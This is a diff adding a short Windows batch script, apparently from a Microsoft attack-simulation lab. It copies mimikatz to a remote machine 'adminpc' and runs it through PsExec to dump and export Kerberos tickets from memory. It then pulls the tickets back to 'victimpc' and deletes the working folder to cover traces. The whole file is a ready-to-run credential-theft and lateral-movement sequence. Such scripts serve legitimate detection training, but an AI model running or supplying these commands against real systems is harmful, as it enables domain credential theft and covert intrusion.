@@ -1,0 +1,15 @@
+:: Copyright (c) Microsoft Corporation.  
+:: Licensed under the MIT license.
+
+:: copy mimikatz to adminpc
+xcopy c:\tools\mimikatz\x64\mimikatz.exe \\adminpc\c$\temp
+pause
+:: psexec to execute mimikatz
+c:\tools\SysinternalsSuite\PsExec.exe \\adminpc -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit")
+pause
+:: copy files back to victimpc
+xcopy \\adminpc\c$\temp\*nuckc* c:\temp\adminpc_tickets
+pause
+:: remove files on adminpc
+rmdir \\adminpc\c$\temp /s /q
+pause
